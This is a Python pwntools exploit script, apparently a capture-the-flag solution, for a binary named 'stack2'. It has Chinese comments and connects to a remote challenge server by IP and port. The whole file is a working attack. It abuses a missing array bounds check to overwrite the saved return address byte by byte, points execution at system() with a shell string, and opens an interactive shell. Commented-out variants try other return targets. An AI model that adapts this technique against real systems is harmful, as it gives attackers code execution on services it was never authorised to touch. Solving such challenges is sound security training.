from pwn import *
context.log_level = 'debug'

# https://bbs.kanxue.com/thread-271465.htm
# 对v5没有任何检测，数组没有边界检查导致的栈溢出
# io = process('./stack2')
io = remote('61.147.171.105',64430)
 
binsh = 0x0804859B

stack_offset = 0x84 # ret:0xffffcefc - eax:0xffffce78 
 
def change(offset, num):
    io.sendlineafter('exit', '3')
    io.sendlineafter('change:', str(offset+stack_offset))
    io.sendlineafter('number:', str(num))
 
io.sendlineafter('have:', '0')
 
# change(0, 0x9b)
# change(1, 0x85)
# change(2, 0x4)
# change(3, 0x8)

system_call = 0x08048450    # call system只要保证参数在栈底就可以
system_plt = 0x080485B4     # plt调用需要与参数之间要加一个return addr
sh = 0x08048987   # /bin/bash = 08048980 + 7
#return to call system
# change(0, 0xb4)
# change(1, 0x85)
# change(2, 0x4)
# change(3, 0x8)
# change(4, 0x87)
# change(5, 0x89)
# change(6, 0x4)
# change(7, 0x8)
#return to system.plt
change(0,0x50)
change(1,0x84)
change(2,0x04)
change(3,0x08)
change(4, 0x00)
change(5, 0x00)
change(6, 0x00)
change(7, 0x00)
change(8, 0x87)
change(9, 0x89)
change(10, 0x4)
change(11, 0x8)
 
io.sendlineafter('exit', '5')
io.interactive()